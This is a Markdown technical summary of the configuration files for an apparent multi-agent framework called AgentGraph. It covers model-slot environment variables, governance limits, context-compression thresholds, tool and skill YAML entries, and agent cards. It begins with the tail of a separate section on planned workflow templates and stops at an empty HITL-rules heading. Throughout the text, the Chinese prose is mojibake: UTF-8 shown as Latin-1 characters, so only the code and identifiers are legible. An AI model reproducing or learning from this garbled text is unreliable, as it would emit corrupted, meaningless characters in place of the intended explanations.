Workflowæ¨¡æ¿ç³»ç»Ÿæ˜¯AgentGraphæ¡†æ¶çš„**é«˜çº§ç¼–æ’èƒ½åŠ›**,åŸºäºç°æœ‰çš„å¤šAgentåä½œåŸºç¡€(delegate_task/call_agent),å°†å¸¸è§åä½œæ¨¡å¼æ ‡å‡†åŒ–ã€‚

**å½“å‰çŠ¶æ€**:
- âœ… åŸºç¡€èƒ½åŠ›å°±ç»ª(Pipeline/Hierarchicalå¯ç”¨)
- ğŸ”„ é«˜çº§ç‰¹æ€§è®¡åˆ’ä¸­(Parallel/é…ç½®åŒ–/å¯è§†åŒ–)

**é¢„è®¡å‘å¸ƒ**:
- v4.0 (å¹¶è¡Œæ”¯æŒ)
- v4.5 (é…ç½®åŒ–DSL)
- v5.0 (é«˜çº§ç‰¹æ€§)

**å‚è€ƒèµ„æ–™**:
- å¤šAgentåä½œç« èŠ‚: ç¬¬2115-2230è¡Œ
- äº§å“æ¶æ„ - å¤šAgentæµç¨‹: ç¬¬908-938è¡Œ

---

*æœ¬ç« èŠ‚æè¿°çš„æ˜¯è®¡åˆ’ä¸­çš„åŠŸèƒ½,å…·ä½“å®ç°å¯èƒ½æ ¹æ®å¼€å‘è¿›åº¦è°ƒæ•´*
# generalAgent/config é…ç½®ç³»ç»Ÿæ€»ç»“

## æ¦‚è¿°

`generalAgent/config/` ç›®å½•åŒ…å«8ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ„æˆäº† AgentGraph æ¡†æ¶çš„å®Œæ•´é…ç½®ç³»ç»Ÿã€‚é…ç½®é‡‡ç”¨ **Pydantic BaseSettings** (Python) å’Œ **YAML** (å£°æ˜å¼) æ··åˆæ¶æ„ï¼Œè‡ªåŠ¨ä» `.env` æ–‡ä»¶åŠ è½½ç¯å¢ƒå˜é‡ã€‚

---

## é…ç½®æ–‡ä»¶æ¸…å•

| æ–‡ä»¶å | ç±»å‹ | è¡Œæ•° | ç”¨é€” |
|--------|------|------|------|
| `settings.py` | Python | 382 | ç¯å¢ƒå˜é‡é…ç½®ï¼ˆ.env â†’ Pydanticï¼‰ |
| `tools.yaml` | YAML | 144 | å·¥å…·å¯ç”¨æ€§å’Œåˆ†ç±» |
| `skills.yaml` | YAML | 50 | æŠ€èƒ½åŠ è½½å’Œæ–‡ä»¶ç±»å‹æ˜ å°„ |
| `agents.yaml` | YAML | 217 | Agent Card å®šä¹‰ï¼ˆA2Aåè®®ï¼‰ |
| `hitl_rules.yaml` | YAML | 128 | HITLå®¡æ‰¹è§„åˆ™ |
| `project_root.py` | Python | 56 | é¡¹ç›®è·¯å¾„è§£æå·¥å…· |
| `skill_config_loader.py` | Python | 152 | Skills YAMLåŠ è½½å™¨ |
| `__init__.py` | Python | 6 | æ¨¡å—å¯¼å‡º |

---

## 1. settings.py - ç¯å¢ƒå˜é‡é…ç½®ï¼ˆ382è¡Œï¼‰

### æ¶æ„è®¾è®¡

ä½¿ç”¨ **Pydantic BaseSettings** å®ç°è‡ªåŠ¨ç¯å¢ƒå˜é‡åŠ è½½ï¼š

```python
Settings (æ ¹è®¾ç½®)
â”œâ”€â”€ ModelRoutingSettings      # 5ä¸ªæ¨¡å‹æ§½ä½é…ç½®
â”œâ”€â”€ GovernanceSettings        # è¿è¡Œæ—¶æ²»ç†è§„åˆ™
â”œâ”€â”€ ObservabilitySettings     # å¯è§‚æµ‹æ€§ï¼ˆæ—¥å¿—/è¿½è¸ªï¼‰
â”œâ”€â”€ ContextManagementSettings # ä¸Šä¸‹æ–‡å‹ç¼©é…ç½®
â””â”€â”€ DocumentSettings          # æ–‡æ¡£å¤„ç†å‚æ•°
```

### 1.1 ModelRoutingSettings - æ¨¡å‹è·¯ç”±é…ç½®

**ç”¨é€”**: é…ç½®5ä¸ªæ¨¡å‹æ§½ä½ï¼ˆbase/reason/vision/code/chatï¼‰ï¼Œæ”¯æŒå¤šæä¾›å•†

**é…ç½®å‚æ•°** (æ¯ä¸ªæ¨¡å‹æ§½ä½åŒ…å«)ï¼š
```bash
# æ¨¡å‹æ ‡è¯†
MODEL_BASE_ID=deepseek-chat
MODEL_BASE_API_KEY=sk-xxx
MODEL_BASE_BASE_URL=https://api.deepseek.com

# ä¸Šä¸‹æ–‡çª—å£å’Œè¾“å‡ºé™åˆ¶
MODEL_BASE_CONTEXT_WINDOW=128000      # ä¸Šä¸‹æ–‡çª—å£å¤§å°ï¼ˆtokensï¼‰
MODEL_BASE_MAX_COMPLETION_TOKENS=2048 # æœ€å¤§è¾“å‡ºé•¿åº¦ï¼ˆtokensï¼‰
```

**5ä¸ªæ¨¡å‹æ§½ä½**:
1. **base** (åŸºç¡€æ¨¡å‹) - å¸¸è§„å¯¹è¯å’Œè§„åˆ’
   - é»˜è®¤: "base-quick"
   - åˆ«å: `MODEL_BASIC_*` (DeepSeek deepseek-chat)

2. **reason** (æ¨ç†æ¨¡å‹) - å¤æ‚æ¨ç†ä»»åŠ¡
   - é»˜è®¤: "reason-strong"
   - åˆ«å: `MODEL_REASONING_*` (DeepSeek deepseek-reasoner)

3. **vision** (è§†è§‰æ¨¡å‹) - å›¾åƒç†è§£
   - é»˜è®¤: "vision-capable"
   - åˆ«å: `MODEL_MULTIMODAL_*` (GLM glm-4.5v)

4. **code** (ä»£ç æ¨¡å‹) - ä»£ç ç”Ÿæˆ
   - é»˜è®¤: "code-specialized"
   - åˆ«å: æ— 

5. **chat** (å¯¹è¯æ¨¡å‹) - é•¿ä¸Šä¸‹æ–‡å¯¹è¯
   - é»˜è®¤: "chat-long-context"
   - åˆ«å: `MODEL_CHAT_*` (Moonshot kimi-k2-0905-preview)

**åˆ«åæ”¯æŒ** (å…¼å®¹æ—§é…ç½®):
- `MODEL_BASIC_*` â†’ `MODEL_BASE_*`
- `MODEL_REASONING_*` â†’ `MODEL_REASON_*`
- `MODEL_MULTIMODAL_*` â†’ `MODEL_VISION_*`

**ç‰¹ç‚¹**:
- âœ… è‡ªåŠ¨ä» `.env` åŠ è½½ï¼ˆæ— éœ€æ‰‹åŠ¨ `os.getenv()`ï¼‰
- âœ… ç±»å‹éªŒè¯ï¼ˆPydanticï¼‰
- âœ… æ”¯æŒå¤šæä¾›å•†ï¼ˆOpenAI/DeepSeek/GLM/Moonshotï¼‰

---

### 1.2 GovernanceSettings - è¿è¡Œæ—¶æ²»ç†

**ç”¨é€”**: æ§åˆ¶ Agent è¿è¡Œæ—¶è¡Œä¸º

**é…ç½®å‚æ•°**:
```bash
# è‡ªåŠ¨å®¡æ‰¹å†™æ“ä½œï¼ˆé»˜è®¤å…³é—­ï¼Œéœ€è¦HITLå®¡æ‰¹ï¼‰
AUTO_APPROVE_WRITES=false

# æœ€å¤§å¾ªç¯æ¬¡æ•°ï¼ˆé˜²æ­¢æ— é™å¾ªç¯ï¼‰
MAX_LOOPS=500              # èŒƒå›´: 1-500ï¼Œé»˜è®¤500

# å†å²æ¶ˆæ¯ä¿ç•™æ•°é‡ï¼ˆé˜²æ­¢å†…å­˜æº¢å‡ºï¼‰
MAX_MESSAGE_HISTORY=500    # é»˜è®¤500æ¡
```

**ç”¨é€”åœºæ™¯**:
- `AUTO_APPROVE_WRITES`: æµ‹è¯•ç¯å¢ƒå¯å¼€å¯ï¼Œç”Ÿäº§ç¯å¢ƒç¦ç”¨
- `MAX_LOOPS`: Agent Loopæœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œé˜²æ­¢æ­»å¾ªç¯
- `MAX_MESSAGE_HISTORY`: é™åˆ¶å†…å­˜ä¸­ä¿ç•™çš„æ¶ˆæ¯æ•°é‡

---

### 1.3 ObservabilitySettings - å¯è§‚æµ‹æ€§

**ç”¨é€”**: é…ç½®æ—¥å¿—ã€è¿½è¸ªã€ä¼šè¯æŒä¹…åŒ–

**é…ç½®å‚æ•°**:
```bash
# LangSmith è¿½è¸ª
LANGSMITH_PROJECT=my-agent-project
LANGSMITH_API_KEY=lsv2_xxx
LANGCHAIN_TRACING_V2=true           # å¯ç”¨è¿½è¸ª

# æ—¥å¿—é…ç½®
LOG_PROMPT_MAX_LENGTH=500           # æ—¥å¿—ä¸­Promptæœ€å¤§é•¿åº¦

# ä¼šè¯æŒä¹…åŒ–
SESSION_DB_PATH=data/sessions.db    # SQLiteæ•°æ®åº“è·¯å¾„
```

**ç‰¹ç‚¹**:
- âœ… LangSmithé›†æˆ - è‡ªåŠ¨ä¸Šä¼ è¿½è¸ªæ•°æ®
- âœ… æ—¥å¿—æˆªæ–­ - é˜²æ­¢æ—¥å¿—è¿‡é•¿
- âœ… SQLiteæŒä¹…åŒ– - ä¼šè¯æ•°æ®å­˜å‚¨

---

### 1.4 ContextManagementSettings - ä¸Šä¸‹æ–‡å‹ç¼©

**ç”¨é€”**: è‡ªåŠ¨ä¸Šä¸‹æ–‡å‹ç¼©ï¼Œé˜²æ­¢è¶…å‡ºæ¨¡å‹ä¸Šä¸‹æ–‡çª—å£

**é…ç½®å‚æ•°**:
```bash
# å¯ç”¨/ç¦ç”¨ä¸Šä¸‹æ–‡ç®¡ç†
CONTEXT_MANAGEMENT_ENABLED=true

# ä¸‰çº§é˜ˆå€¼ç›‘æ§
CONTEXT_INFO_THRESHOLD=0.70        # 70% - è®°å½•infoæ—¥å¿—
CONTEXT_WARNING_THRESHOLD=0.80     # 80% - è®°å½•warningæ—¥å¿—
CONTEXT_CRITICAL_THRESHOLD=0.95    # 95% - è§¦å‘è‡ªåŠ¨å‹ç¼©

# ä¿ç•™ç­–ç•¥
CONTEXT_KEEP_RECENT_RATIO=0.20     # ä¿ç•™20%ä¸Šä¸‹æ–‡çª—å£ä½œä¸º"æœ€è¿‘æ¶ˆæ¯"
CONTEXT_KEEP_RECENT_MESSAGES=10    # æˆ–è‡³å°‘ä¿ç•™10æ¡æ¶ˆæ¯ï¼ˆå–å…ˆåˆ°è¾¾è€…ï¼‰

# å‹ç¼©è§¦å‘æ¡ä»¶
CONTEXT_MIN_MESSAGES_TO_COMPRESS=5 # è‡³å°‘5æ¡æ¶ˆæ¯æ‰å‹ç¼©

# åº”æ€¥å›é€€ï¼ˆå¦‚æœLLMå‹ç¼©å¤±è´¥ï¼‰
CONTEXT_MAX_HISTORY_MESSAGES=100   # ä¿ç•™æœ€è¿‘100æ¡æ¶ˆæ¯
```

**å·¥ä½œåŸç†**:
1. **Tokenç›‘æ§**: æ¯æ¬¡LLMè°ƒç”¨åç»Ÿè®¡ `cumulative_prompt_tokens`
2. **é˜ˆå€¼æ£€æµ‹**: è¾¾åˆ°95%æ—¶ï¼ŒPlannerè®¾ç½® `needs_compression=True`
3. **è·¯ç”±å‹ç¼©**: æ¡ä»¶è·¯ç”±å¯¼å‘ `summarization` èŠ‚ç‚¹
4. **LLMå‹ç¼©**: æ—§æ¶ˆæ¯å‹ç¼©ä¸ºæ‘˜è¦ï¼Œä¿ç•™æœ€è¿‘æ¶ˆæ¯
5. **å›é€€æœºåˆ¶**: å¦‚æœå¤±è´¥ï¼Œç›´æ¥æˆªæ–­ä¿ç•™æœ€è¿‘100æ¡

**å…¸å‹æ•ˆæœ**:
- 302æ¡æ¶ˆæ¯ (~123K tokens, 96%ä½¿ç”¨ç‡) â†’ 13æ¡æ¶ˆæ¯ (~6.5K tokens, 95%å‹ç¼©ç‡)

---

### 1.5 DocumentSettings - æ–‡æ¡£å¤„ç†

**ç”¨é€”**: é…ç½®æ–‡æ¡£è¯»å–ã€ç´¢å¼•ã€æœç´¢è¡Œä¸º

**é…ç½®å‚æ•°**:
```python
# æ–‡ä»¶å¤§å°é™åˆ¶
text_file_max_size: int = 50_000      # çº¯æ–‡æœ¬æ–‡ä»¶æœ€å¤§å­—ç¬¦æ•°
pdf_preview_pages: int = 5            # PDFé¢„è§ˆé¡µæ•°

# æ–‡æ¡£åˆ†å—å‚æ•°
chunk_max_size: int = 400             # ç´¢å¼•åˆ†å—å¤§å°ï¼ˆå­—ç¬¦ï¼‰
chunk_overlap: int = 80               # åˆ†å—é‡å ï¼ˆé˜²æ­¢è¯­ä¹‰æ–­è£‚ï¼‰

# æœç´¢é…ç½®
use_jieba: bool = True                # å¯ç”¨ä¸­æ–‡åˆ†è¯ï¼ˆJiebaï¼‰
search_algorithm: str = "bm25"        # æœç´¢ç®—æ³•ï¼ˆbm25 | tfidfï¼‰
index_backend: str = "fts5"           # ç´¢å¼•åç«¯ï¼ˆfts5 | jsonï¼‰
```

**ç‰¹ç‚¹**:
- âœ… **å¤šæ ¼å¼æ”¯æŒ**: PDF/DOCX/XLSX/PPTX
- âœ… **æ™ºèƒ½é¢„è§ˆ**: å°æ–‡ä»¶å…¨æ–‡ï¼Œå¤§æ–‡ä»¶é¢„è§ˆ
- âœ… **FTS5ç´¢å¼•**: SQLiteå…¨æ–‡æœç´¢ï¼Œæ”¯æŒä¸­æ–‡
- âœ… **å¤šç­–ç•¥æœç´¢**: çŸ­è¯­åŒ¹é…(10åˆ†) > Trigrams(5åˆ†) > Bigrams(3åˆ†) > å…³é”®è¯(2åˆ†)

---

## 2. tools.yaml - å·¥å…·é…ç½®ï¼ˆ144è¡Œï¼‰

### æ¶æ„è®¾è®¡

```yaml
tools.yaml
â”œâ”€â”€ core: {}                    # 13ä¸ªæ ¸å¿ƒå·¥å…·ï¼ˆæ€»æ˜¯å¯ç”¨ï¼‰
â”œâ”€â”€ optional: {}                # 10ä¸ªå¯é€‰å·¥å…·ï¼ˆæŒ‰éœ€å¯ç”¨ï¼‰
â”œâ”€â”€ directories: {}             # å·¥å…·ç›®å½•é…ç½®
â””â”€â”€ hot_reload: {}              # çƒ­é‡è½½é…ç½®
```

### 2.1 Core Tools - æ ¸å¿ƒå·¥å…·ï¼ˆ13ä¸ªï¼‰

**ç‰¹ç‚¹**: æ€»æ˜¯å¯ç”¨ï¼Œæ— éœ€@mention

| å·¥å…·ID | åˆ†ç±» | æ ‡ç­¾ | ç”¨é€” |
|--------|------|------|------|
| `now` | meta | meta, time | è·å–å½“å‰UTCæ—¶é—´ |
| `todo_write` | meta | meta, task | å†™å…¥TODOä»»åŠ¡ |
| `todo_read` | meta | meta, task | è¯»å–TODOä»»åŠ¡ |
| `delegate_task` | agent | agent, delegation | å§”æ´¾å­ä»»åŠ¡ç»™Subagent |
| `call_external_agent` | agent | agent, handoff | è°ƒç”¨å¤–éƒ¨Agentï¼ˆA2Aåè®®ï¼‰ |
| `ask_human` | agent | agent, hitl | è¯·æ±‚ç”¨æˆ·è¾“å…¥ï¼ˆHITLï¼‰ |
| `read_file` | read | read, file | è¯»å–æ–‡ä»¶ï¼ˆå¤šæ ¼å¼ï¼‰ |
| `write_file` | write | write, file | å†™å…¥æ–‡ä»¶ |
| `edit_file` | write | write, file | ç²¾ç¡®ç¼–è¾‘æ–‡ä»¶ |
| `list_workspace_files` | read | read, file, meta | åˆ—å‡ºå·¥ä½œåŒºæ–‡ä»¶ |
| `find_files` | read | read, file, search | æ–‡ä»¶åæœç´¢ï¼ˆglobï¼‰ |
| `search_file` | read | read, file, search | å†…å®¹æœç´¢ï¼ˆFTS5ï¼‰ |
| `run_bash_command` | compute | compute, shell | æ‰§è¡ŒBashå‘½ä»¤ |

**é…ç½®ç¤ºä¾‹**:
```yaml
core:
  now:
    category: "meta"
    tags: ["meta", "time"]
    description: "Get current UTC time"

  delegate_task:
    category: "agent"
    tags: ["agent", "delegation"]
    description: "Delegate complex multi-step tasks to an isolated agent"
```

---

### 2.2 Optional Tools - å¯é€‰å·¥å…·ï¼ˆ10ä¸ªï¼‰

**ç‰¹ç‚¹**: å¯é€‰å¯ç”¨ï¼Œæ”¯æŒ `@mention` åŠ è½½

| å·¥å…·ID | å¯ç”¨çŠ¶æ€ | å­Agentç»§æ‰¿ | åˆ†ç±» | ç”¨é€” |
|--------|----------|-------------|------|------|
| `fetch_web` | âœ… å¯ç”¨ | âœ… å¯ç»§æ‰¿ | network | ç½‘é¡µæŠ“å–ï¼ˆJina Readerï¼‰ |
| `search_web` | âœ… å¯ç”¨ | âœ… å¯ç»§æ‰¿ | network | ç½‘é¡µæœç´¢ï¼ˆSearxngï¼‰ |
| `compact_context` | âŒ ç¦ç”¨ | âŒ ä¸å¯ç»§æ‰¿ | meta | æ‰‹åŠ¨å‹ç¼©ä¸Šä¸‹æ–‡ |
| `http_fetch` | âŒ ç¦ç”¨ | âœ… å¯ç»§æ‰¿ | network | HTTPè¯·æ±‚ï¼ˆåŸå§‹ï¼‰ |
| `web_search` | âŒ ç¦ç”¨ | âœ… å¯ç»§æ‰¿ | network | ç½‘é¡µæœç´¢ï¼ˆå¤‡é€‰ï¼‰ |
| `extract_links` | âŒ ç¦ç”¨ | âœ… å¯ç»§æ‰¿ | read | æå–ç½‘é¡µé“¾æ¥ |
| `ask_vision` | âŒ ç¦ç”¨ | âœ… å¯ç»§æ‰¿ | agent | è§†è§‰æ¨¡å‹é—®ç­” |

**é…ç½®ç¤ºä¾‹**:
```yaml
optional:
  fetch_web:
    enabled: true                    # å¯åŠ¨æ—¶åŠ è½½
    available_to_subagent: true      # å­Agentå¯ç»§æ‰¿
    category: "network"
    tags: ["network", "read", "web"]
    description: "Fetch web pages and convert to markdown using Jina Reader"

  compact_context:
    enabled: false                   # ä¸åŠ è½½ï¼ˆéœ€@mentionï¼‰
    available_to_subagent: false     # å­Agentä¸å¯ç”¨
    category: "meta"
    tags: ["meta", "context"]
    description: "Manually trigger context compression"
```

**å­Agentç»§æ‰¿è§„åˆ™**:
- âœ… **Coreå·¥å…·**: æ€»æ˜¯ç»§æ‰¿
- âœ… **Optionalå·¥å…· + `available_to_subagent: true`**: ç»§æ‰¿ï¼ˆå½“ä¸»Agent @mentionåï¼‰
- âŒ **Optionalå·¥å…· + `available_to_subagent: false`**: ä¸ç»§æ‰¿ï¼ˆé˜²æ­¢æ»¥ç”¨ï¼‰

---

### 2.3 å…¶ä»–é…ç½®

**å·¥å…·ç›®å½•**:
```yaml
directories:
  builtin: "generalAgent/tools/builtin"   # å†…ç½®å·¥å…·ç›®å½•
  custom: "generalAgent/tools/custom"     # è‡ªå®šä¹‰å·¥å…·ç›®å½•
```

**çƒ­é‡è½½** (è®¡åˆ’ä¸­):
```yaml
hot_reload:
  enabled: false                          # æš‚æœªå¯ç”¨
  watch_interval: 5                       # ç›‘æ§é—´éš”ï¼ˆç§’ï¼‰
```

---

## 3. skills.yaml - æŠ€èƒ½é…ç½®ï¼ˆ50è¡Œï¼‰

### æ¶æ„è®¾è®¡

```yaml
skills.yaml
â”œâ”€â”€ global: {}         # å…¨å±€è®¾ç½®
â”œâ”€â”€ core: []           # æ ¸å¿ƒæŠ€èƒ½ï¼ˆæ€»æ˜¯åŠ è½½ï¼‰
â”œâ”€â”€ optional: {}       # å¯é€‰æŠ€èƒ½ï¼ˆæŒ‰éœ€åŠ è½½ï¼‰
â””â”€â”€ directories: {}    # æŠ€èƒ½ç›®å½•
```

### 3.1 Global Settings

```yaml
global:
  enabled: true                        # å¯ç”¨æŠ€èƒ½ç³»ç»Ÿ
  auto_load_on_file_upload: true       # ä¸Šä¼ æ–‡ä»¶æ—¶è‡ªåŠ¨åŠ è½½æŠ€èƒ½
```

### 3.2 Core Skills

```yaml
core: []  # é»˜è®¤ä¸ºç©ºï¼ˆæ— æ ¸å¿ƒæŠ€èƒ½ï¼‰
```

### 3.3 Optional Skillsï¼ˆ4ä¸ªï¼‰

| æŠ€èƒ½ID | å¯ç”¨çŠ¶æ€ | è‡ªåŠ¨åŠ è½½æ–‡ä»¶ç±»å‹ | æè¿° |
|--------|----------|------------------|------|
| `pdf` | âŒ ç¦ç”¨ | `["pdf"]` | PDFå¤„ç†å’Œè¡¨å•å¡«å†™ |
| `docx` | âœ… å¯ç”¨ | `["docx"]` | DOCXæ–‡æ¡£å¤„ç† |
| `xlsx` | âœ… å¯ç”¨ | `["xlsx"]` | Excelè¡¨æ ¼å¤„ç† |
| `pptx` | âœ… å¯ç”¨ | `["pptx"]` | PowerPointæ¼”ç¤ºæ–‡ç¨¿å¤„ç† |

**é…ç½®ç¤ºä¾‹**:
```yaml
optional:
  pdf:
    enabled: false                        # é»˜è®¤ä¸åŠ è½½
    always_available: false
    description: "PDF processing and form filling"
    auto_load_on_file_types: ["pdf"]      # ä¸Šä¼ PDFæ—¶è‡ªåŠ¨åŠ è½½

  docx:
    enabled: true                         # å¯åŠ¨æ—¶åŠ è½½
    always_available: false
    description: "docx file processing and form filling"
    auto_load_on_file_types: ["docx"]
```

### 3.4 åŠ è½½è¡Œä¸º

**åŠ è½½æ—¶æœº**:
1. **å¯åŠ¨åŠ è½½**: `enabled: true` çš„æŠ€èƒ½
2. **@mentionåŠ è½½**: ç”¨æˆ·è¾“å…¥ `@pdf` æ—¶åŠ è½½
3. **æ–‡ä»¶ä¸Šä¼ åŠ è½½**: ä¸Šä¼  `.pdf` æ–‡ä»¶æ—¶è‡ªåŠ¨åŠ è½½ `pdf` æŠ€èƒ½

**Catalogè¿‡æ»¤**:
- âœ… **`enabled: true`**: å‡ºç°åœ¨SystemMessageçš„æŠ€èƒ½ç›®å½•ä¸­
- âŒ **`enabled: false`**: ä¸å‡ºç°åœ¨ç›®å½•ä¸­ï¼ˆå‡å°‘Promptå™ªéŸ³ï¼‰

**ä¾èµ–ç®¡ç†**:
- è‡ªåŠ¨æ£€æµ‹ `skills/{skill_id}/requirements.txt`
- é¦–æ¬¡åŠ è½½æ—¶è‡ªåŠ¨å®‰è£…ä¾èµ– (`pip install -r requirements.txt`)

---

## 4. agents.yaml - Agent Cardé…ç½®ï¼ˆ217è¡Œï¼‰

### åŸºäºA2Aåè®®

å‚è€ƒæ ‡å‡†: [A2A Protocol - Agent Discovery](https://a2a-protocol.org/latest/topics/agent-discovery/)

### æ¶æ„è®¾è®¡

```yaml
agents.yaml
â”œâ”€â”€ global: {}         # å…¨å±€è®¾ç½®
â”œâ”€â”€ core: {}           # æ ¸å¿ƒAgentsï¼ˆæ€»æ˜¯å¯ç”¨ï¼‰
â”œâ”€â”€ optional: {}       # å¯é€‰Agentsï¼ˆæŒ‰éœ€åŠ è½½ï¼‰
â””â”€â”€ [æœªæ¥æ‰©å±•]
```

### 4.1 Global Settings

```yaml
global:
  enabled: true                  # å¯ç”¨Agentsç³»ç»Ÿ
  show_in_catalog: true          # åœ¨SystemMessageä¸­æ˜¾ç¤ºAgentç›®å½•
```

### 4.2 Optional Agentsï¼ˆ2ä¸ªï¼‰

#### 4.2.1 SimpleAgent - è½»é‡çº§Agent

**åŸºæœ¬ä¿¡æ¯**:
```yaml
simple:
  name: "SimpleAgent"
  description: "è½»é‡çº§ Agentï¼Œé€‚åˆå¿«é€Ÿæ‰§è¡Œç®€å•ä»»åŠ¡ï¼ˆæ— çŠ¶æ€ï¼Œå•æ¬¡è°ƒç”¨ï¼‰"
  provider: "local"                                # æœ¬åœ°Agent
  version: "1.0.0"
  factory_path: "simpleAgent.simple_agent:SimpleAgent"
```

**Capabilitiesï¼ˆèƒ½åŠ›ç‰¹æ€§ï¼‰**:
- âœ… **stateless** - æ— çŠ¶æ€ï¼Œä¸ä¿ç•™ä¼šè¯å†å²
- âœ… **fast** - å¿«é€Ÿå“åº”ï¼Œæ— åˆå§‹åŒ–å¼€é”€
- âœ… **single_turn** - å•è½®å¯¹è¯ï¼Œä¸€æ¬¡æ€§å®Œæˆ
- âœ… **template_support** - æ”¯æŒè‡ªå®šä¹‰Promptæ¨¡æ¿

**Skillsï¼ˆæŠ€èƒ½æ¸…å•ï¼‰** - 3ä¸ª:

1. **quick_analysis** - å¿«é€Ÿåˆ†æ
   - ç”¨é€”: åˆ†æå•ä¸ªæ–‡ä»¶ï¼ˆ<100è¡Œä»£ç ï¼‰æˆ–å°å‹æ–‡æ¡£
   - è¾“å…¥æ¨¡å¼: text
   - è¾“å‡ºæ¨¡å¼: markdown
   - ç¤ºä¾‹:
     - "åˆ†æ uploads/script.py çš„å¤æ‚åº¦"
     - "å®¡æŸ¥ uploads/config.json çš„è¯­æ³•é”™è¯¯"
     - "æ£€æŸ¥ uploads/data.csv çš„æ•°æ®è´¨é‡"

2. **reasoning_task** - æ¨ç†ä»»åŠ¡
   - ç”¨é€”: ä½¿ç”¨æ¨ç†æ¨¡å‹è§£å†³æ•°å­¦/é€»è¾‘é—®é¢˜
   - ç¤ºä¾‹:
     - "è®¡ç®— fibonacci(100)"
     - "è§£å†³8çš‡åé—®é¢˜"
     - "è¯æ˜è´¹é©¬å¤§å®šç†"

3. **code_review** - ä»£ç å®¡æŸ¥
   - ç”¨é€”: å¿«é€Ÿä»£ç å®¡æŸ¥ï¼ˆè¯­æ³•ã€é£æ ¼ã€å®‰å…¨ï¼‰
   - ç¤ºä¾‹:
     - "å®¡æŸ¥ uploads/api.py çš„å®‰å…¨é—®é¢˜"
     - "æ£€æŸ¥ uploads/component.tsx çš„ React æœ€ä½³å®è·µ"

**å…ƒæ•°æ®**:
```yaml
tags: ["lightweight", "stateless", "single-turn", "fast"]
enabled: true                       # å¯ç”¨
always_available: false             # éœ€@mention
available_to_subagent: true         # å­Agentå¯è°ƒç”¨
```

---

#### 4.2.2 GeneralAgent - å…¨åŠŸèƒ½Agent

**åŸºæœ¬ä¿¡æ¯**:
```yaml
general:
  name: "GeneralAgent"
  description: "å®Œæ•´åŠŸèƒ½çš„ Agentï¼Œæ”¯æŒæŠ€èƒ½ã€å¤šè½®å¯¹è¯ã€ä¼šè¯æŒä¹…åŒ–ï¼ˆæœ‰çŠ¶æ€ï¼‰"
  provider: "local"
  version: "1.0.0"
  factory_path: "generalAgent.runtime.app:build_application"
```

**Capabilitiesï¼ˆèƒ½åŠ›ç‰¹æ€§ï¼‰**:
- âœ… **stateful** - æœ‰çŠ¶æ€ï¼Œä¿ç•™å®Œæ•´ä¼šè¯å†å²
- âœ… **multi_turn** - æ”¯æŒå¤šè½®å¯¹è¯
- âœ… **skill_system** - æ”¯æŒæŠ€èƒ½åŒ…ï¼ˆ@mention skillsï¼‰
- âœ… **hitl** - æ”¯æŒäººæœºäº¤äº’å®¡æ‰¹
- âœ… **persistence** - æ”¯æŒä¼šè¯æŒä¹…åŒ–ï¼ˆSQLiteï¼‰
- âœ… **workspace** - ç‹¬ç«‹çš„å·¥ä½œç©ºé—´éš”ç¦»

**Skillsï¼ˆæŠ€èƒ½æ¸…å•ï¼‰** - 3ä¸ª:

1. **complex_document_analysis** - å¤æ‚æ–‡æ¡£åˆ†æ
   - ç”¨é€”: åˆ†æå¤§å‹æ–‡æ¡£ï¼ˆ>10é¡µï¼‰
   - ç¤ºä¾‹:
     - "åˆ†æ uploads/report.pdfï¼ˆ80é¡µï¼‰ï¼Œæå–æ‰€æœ‰è¡¨æ ¼æ•°æ®"
     - "æ€»ç»“ uploads/research.docxï¼ˆ50é¡µï¼‰çš„ç ”ç©¶ç»“è®º"

2. **skill_based_task** - åŸºäºæŠ€èƒ½çš„ä»»åŠ¡
   - ç”¨é€”: éœ€è¦ä½¿ç”¨æŠ€èƒ½åŒ…çš„ä»»åŠ¡
   - ç¤ºä¾‹:
     - "ä½¿ç”¨ @pdf æŠ€èƒ½å¡«å†™ uploads/form.pdf è¡¨å•"
     - "ä½¿ç”¨ @docx æŠ€èƒ½ä¿®æ”¹ uploads/contract.docx ä¸­çš„åˆåŒæ¡æ¬¾"

3. **multi_step_research** - å¤šæ­¥éª¤ç ”ç©¶
   - ç”¨é€”: éœ€è¦å¤šè½®å·¥å…·è°ƒç”¨çš„ç ”ç©¶ä»»åŠ¡
   - ç¤ºä¾‹:
     - "ç ”ç©¶ Python 3.13 çš„æ–°ç‰¹æ€§ï¼Œå¹¶ç”Ÿæˆå¯¹æ¯”æŠ¥å‘Š"
     - "åˆ†æç«å“çš„å®šä»·ç­–ç•¥ï¼Œç”Ÿæˆå¸‚åœºåˆ†ææŠ¥å‘Š"

**å…ƒæ•°æ®**:
```yaml
tags: ["full-featured", "stateful", "multi-turn", "complex"]
enabled: false                      # é»˜è®¤ä¸å¯ç”¨ï¼ˆèŠ‚ç‚¹å°šæœªå®ç°ï¼‰
always_available: false
available_to_subagent: false        # é˜²æ­¢æ— é™é€’å½’
```

---

### 4.3 Handoff Pattern ä½¿ç”¨è¯´æ˜

**Agentå‘ç°ä¸è°ƒç”¨**:
1. ç³»ç»Ÿä¸ºæ¯ä¸ª `enabled` agent è‡ªåŠ¨ç”Ÿæˆ `transfer_to_{agent_id}` å·¥å…·
2. ç”¨æˆ·é€šè¿‡ `@agent_id` è§¦å‘ï¼ˆå¦‚ `@simple`ï¼‰
3. LLMè‡ªä¸»é€‰æ‹©åˆé€‚çš„Agent

**Catalogæ˜¾ç¤ºæ¨¡å¼**:
- **é»˜è®¤**: ç²¾ç®€æ¨¡å¼ï¼ˆä»…IDå’Œæè¿°ï¼ŒèŠ‚çœtokensï¼‰
- **@mentionæ—¶**: åŠ¨æ€æ˜¾ç¤ºè¯¦ç»†æŠ€èƒ½ä¿¡æ¯ï¼ˆåœ¨reminderä¸­ï¼‰

**ç¤ºä¾‹**:
```
User> @simple åˆ†æ uploads/script.py çš„å¤æ‚åº¦
System> [åŠ è½½ SimpleAgentï¼Œæ˜¾ç¤ºè¯¦ç»†æŠ€èƒ½]
LLM> [çœ‹åˆ° transfer_to_simple å·¥å…·ï¼Œè°ƒç”¨]
SimpleAgent> [æ‰§è¡Œä»»åŠ¡ï¼Œè¿”å›ç»“æœ]
```

---

### 4.4 æœªæ¥æ‰©å±•

**è®¡åˆ’ä¸­çš„Agents**:
- **QAAgent** - é—®ç­”å’ŒçŸ¥è¯†æ£€ç´¢
- **CodeAgent** - ä»£ç ç”Ÿæˆå’Œå®¡æŸ¥

---

## 5. hitl_rules.yaml - HITLå®¡æ‰¹è§„åˆ™ï¼ˆ128è¡Œï¼‰

